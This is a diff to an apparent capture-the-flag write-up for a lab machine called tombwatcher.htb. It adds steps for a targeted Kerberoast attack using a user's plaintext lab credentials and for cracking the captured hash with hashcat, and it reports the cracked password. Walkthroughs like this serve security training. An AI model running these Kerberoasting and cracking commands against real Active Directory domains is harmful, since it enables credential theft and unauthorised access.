@@ -33,6 +33,11 @@
 2. With Henry's credentials, enumerate network using Bloodhound. Found high-level path to machine
 ![image](https://github.com/user-attachments/assets/acff890c-ed2b-45b7-a016-f0f7f93aebef)
 
-3. 
+3. With Henry's credentials, do a targeted kerberoast attack on Alfred
+`targetedKerberoast.py -v -d tombwatcher.htb -u henry -p H3nry_987TGV!`
+
+4. We crack the hash using hashcat and we get Alfred's password: basketball
+`hashcat -m 13100 hash.txt /usr/share/wordlist/rockyou.txt`
+
 
 
